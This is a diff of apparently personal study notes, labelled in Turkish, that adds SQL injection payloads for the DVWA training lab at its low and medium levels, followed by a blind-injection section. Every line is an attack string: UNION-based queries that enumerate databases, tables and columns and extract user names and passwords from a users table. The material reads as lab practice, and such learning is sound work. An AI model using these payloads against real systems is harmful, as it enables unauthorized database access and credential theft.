@@ -3,8 +3,23 @@ low Seviye
 1' and 1=1 union select database(),user()#
 1' and 1=1 union select null,table_name from information_schema.tables#
 1' and 1=1 union select user,password from users#
+========================================================================================================================
+Sinif
+low
+1' and 1=1 union select database(),user()#
+1' and 1=1 union select null,table_name from information_schema.tables where table_schema='dvwa' #
+1' and 1=1 union select null,column_name from information_schema.columns where table_schema='dvwa' #
+1' and 1=1 union select user,password from users#
 
-
+Medium
+19 or 1=1 union select version(),database()
+19 or 1=1 union select null, user()
+19 or 1=1 union select null, table_name from information_schema.tables
+19 or 1=1 union select null, concat(table_name,0x0a,column_name) from information_schema.columns
+19 or 1=1 union select null, concat(table_name,0x0a,column_name) from information_schema.columns where table_name=0x7573657273
+19 or 1=1 union select null, concat(first_name,0x0a,password) from users
+19 or 1=1 union select null,@@datadir
+====================================================================================================================
 Blind SQL İnjection
 
 1' and 1=0 union select null,table_name from information_schema.tables#
